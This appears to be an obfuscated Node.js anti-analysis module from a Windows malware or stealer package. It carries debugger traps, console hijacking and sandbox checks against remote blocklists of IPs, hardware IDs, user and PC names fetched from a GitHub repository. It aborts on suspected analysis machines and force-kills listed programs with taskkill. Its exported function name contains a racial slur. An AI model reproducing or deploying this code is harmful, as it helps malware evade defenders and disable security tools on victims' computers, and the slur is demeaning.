const _0x2b7ab7 = (function () {
    let _0x455838 = true
    return function (_0x42a1b5, _0x4280cb) {
      const _0x38b56e = _0x455838
        ? function () {
            if (_0x4280cb) {
              const _0x536b4e = _0x4280cb.apply(_0x42a1b5, arguments)
              return (_0x4280cb = null), _0x536b4e
            }
          }
        : function () {}
      return (_0x455838 = false), _0x38b56e
    }
  })(),
  _0x954fb5 = _0x2b7ab7(this, function () {
    return _0x954fb5
      .toString()
      .search('(((.+)+)+)+$')
      .toString()
      .constructor(_0x954fb5)
      .search('(((.+)+)+)+$')
  })
_0x954fb5()
const _0x35ee96 = (function () {
  let _0x21b2e7 = true
  return function (_0x268ec4, _0x39d34d) {
    const _0x3b857a = _0x21b2e7
      ? function () {
          if (_0x39d34d) {
            const _0xe02e33 = _0x39d34d.apply(_0x268ec4, arguments)
            return (_0x39d34d = null), _0xe02e33
          }
        }
      : function () {}
    return (_0x21b2e7 = false), _0x3b857a
  }
})()
;(function () {
  _0x35ee96(this, function () {
    const _0x1ac2ba = new RegExp('function *\\( *\\)')
    const _0x52eb79 = new RegExp('\\+\\+ *(?:[a-zA-Z_$][0-9a-zA-Z_$]*)', 'i')
    const _0x443336 = _0x41b7e3('init')
    !_0x1ac2ba.test(_0x443336 + 'chain') || !_0x52eb79.test(_0x443336 + 'input')
      ? _0x443336('0')
      : _0x41b7e3()
  })()
})()
const _0x19af83 = (function () {
    let _0x5610e8 = true
    return function (_0x662176, _0x255b3a) {
      const _0x159317 = _0x5610e8
        ? function () {
            if (_0x255b3a) {
              const _0x8ea9e = _0x255b3a.apply(_0x662176, arguments)
              return (_0x255b3a = null), _0x8ea9e
            }
          }
        : function () {}
      return (_0x5610e8 = false), _0x159317
    }
  })(),
  _0x590e94 = _0x19af83(this, function () {
    const _0x1b1775 = function () {
      let _0x3fa69c
      try {
        _0x3fa69c = Function(
          'return (function() {}.constructor("return this")( ));'
        )()
      } catch (_0x2660a8) {
        _0x3fa69c = window
      }
      return _0x3fa69c
    }
    const _0x16d41a = _0x1b1775()
    const _0x1c226d = (_0x16d41a.console = _0x16d41a.console || {}),
      _0x10fe69 = [
        'log',
        'warn',
        'info',
        'error',
        'exception',
        'table',
        'trace',
      ]
    for (let _0x330145 = 0; _0x330145 < _0x10fe69.length; _0x330145++) {
      const _0x2f6bb8 = _0x19af83.constructor.prototype.bind(_0x19af83),
        _0x5c9e91 = _0x10fe69[_0x330145],
        _0x4b3cc2 = _0x1c226d[_0x5c9e91] || _0x2f6bb8
      _0x2f6bb8['__proto__'] = _0x19af83.bind(_0x19af83)
      _0x2f6bb8.toString = _0x4b3cc2.toString.bind(_0x4b3cc2)
      _0x1c226d[_0x5c9e91] = _0x2f6bb8
    }
  })
_0x590e94()
const _0x3c8729 = require('util')
const _0x4641f1 = _0x3c8729.promisify(require('child_process').exec),
  _0x47cd97 = require('axios')
async function _0x408ef9(
  _0x7bed27,
  _0x20831c,
  _0x2d2083,
  _0x26210d,
  _0x40e8db,
  _0x10dc29
) {
  if (_0x7bed27 !== 'yes') {
    return
  }
  const _0x48edc7 = process.env.COMPUTERNAME || 'IDK'
  const _0x51a4e0 = process.env.USERNAME || 'IDK',
    [_0x3f5551, _0x4031ca, _0x2a09ea, _0x42a264] = await Promise.all([
      _0x145026(_0x20831c),
      _0x4758a4(_0x40e8db),
      _0x4b1512(_0x51a4e0),
      _0x3b6633(_0x48edc7),
    ])
  ;((!isNaN(_0x2d2083) && _0x2d2083 < 50) ||
    (!isNaN(_0x26210d) && _0x26210d < 3) ||
    (!isNaN(_0x10dc29) && _0x10dc29 < 2) ||
    _0x3f5551 ||
    _0x4031ca ||
    _0x2a09ea ||
    _0x42a264) &&
    process.abort()
  try {
    _0x98fa0c()
  } catch (_0x39b900) {}
}
async function _0x98fa0c() {
  try {
    const _0x2c7d50 = await _0x47cd97.get(
        'https://raw.githubusercontent.com/FalseKSCH/testingsomedead/main/nope.json'
      ),
      _0x4ec8d1 = _0x2c7d50.data,
      _0x2167ff = _0x4ec8d1.blacklistedprog,
      { stdout: _0x932002 } = await _0x4641f1('tasklist'),
      _0x38cca1 = _0x932002.split(/\r?\n/)
    _0x38cca1.forEach((_0xd56c1f) => {
      const _0x27518f = _0xd56c1f.split(/\s+/)[0].replace('.exe', '')
      if (_0x2167ff.includes(_0x27518f)) {
        try {
          _0x4641f1('taskkill /F /IM ' + _0x27518f + '.exe', (_0x447e0b) => {
            if (_0x447e0b) {
            } else {
            }
          })
        } catch (_0xfdd486) {}
      }
    })
  } catch (_0x4815f0) {}
}
async function _0x3b6633(_0x5ee6f6) {
  try {
    const _0x5ca88e = await _0x47cd97.get(
        'https://raw.githubusercontent.com/FalseKSCH/testingsomedead/main/blockedpcname.json'
      ),
      _0x24e21a = _0x5ca88e.data
    return _0x24e21a.includes(_0x5ee6f6)
  } catch (_0x5554f8) {
    return false
  }
}
async function _0x4b1512(_0x28c64f) {
  try {
    const _0x44758b = await _0x47cd97.get(
        'https://raw.githubusercontent.com/FalseKSCH/testingsomedead/main/blocked_progr.json'
      ),
      _0xe176ed = _0x44758b.data
    return _0xe176ed.includes(_0x28c64f)
  } catch (_0x25f88c) {
    return false
  }
}
async function _0x4758a4(_0x3c7938) {
  try {
    const _0x1d8aca = await _0x47cd97.get(
        'https://raw.githubusercontent.com/FalseKSCH/testingsomedead/main/blocked_hwid.json'
      ),
      _0x5a0323 = _0x1d8aca.data
    return _0x5a0323.includes(_0x3c7938)
  } catch (_0x3b7a32) {
    return false
  }
}
async function _0x145026(_0x29b266) {
  try {
    const _0x5c86eb = await _0x47cd97.get(
        'https://raw.githubusercontent.com/FalseKSCH/testingsomedead/main/blocked_ips.json'
      ),
      _0x34ff37 = _0x5c86eb.data
    return _0x34ff37.includes(_0x29b266)
  } catch (_0x4900e9) {
    return false
  }
}
module.exports = { DoNoDebugNegger: _0x408ef9 }
function _0x41b7e3(_0x2b2803) {
  function _0x4dd754(_0x20f8a4) {
    if (typeof _0x20f8a4 === 'string') {
      return function (_0xac4d54) {}
        .constructor('while (true) {}')
        .apply('counter')
    } else {
      ;('' + _0x20f8a4 / _0x20f8a4).length !== 1 || _0x20f8a4 % 20 === 0
        ? function () {
            return true
          }
            .constructor('debugger')
            .call('action')
        : function () {
            return false
          }
            .constructor('debugger')
            .apply('stateObject')
    }
    _0x4dd754(++_0x20f8a4)
  }
  try {
    if (_0x2b2803) {
      return _0x4dd754
    } else {
      _0x4dd754(0)
    }
  } catch (_0x30ac62) {}
}
